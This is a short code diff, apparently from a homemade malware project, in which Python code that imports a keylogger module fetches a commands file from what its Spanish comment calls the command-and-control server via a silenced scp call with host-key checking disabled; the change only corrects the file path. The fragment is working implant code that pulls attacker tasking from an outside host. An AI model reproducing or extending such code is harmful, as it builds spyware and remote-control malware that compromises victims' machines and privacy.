@@ -12,7 +12,7 @@ import keylogger
 comandos = [ ]
 
 #copiamos el archivo que contiene los comandos desde el comand an control
-os.system("scp -q -o StrictHostKeyChecking=no manavi@192.168.222.13:~/comandos.txt /tmp 1>/dev/null")
+os.system("scp -q -o StrictHostKeyChecking=no manavi@192.168.222.13:~/comandos.txt /tmp/comandos.txt 1>/dev/null")
 
 if os.path.exists("/tmp/comandos.txt"):
         #Leemos el archivo
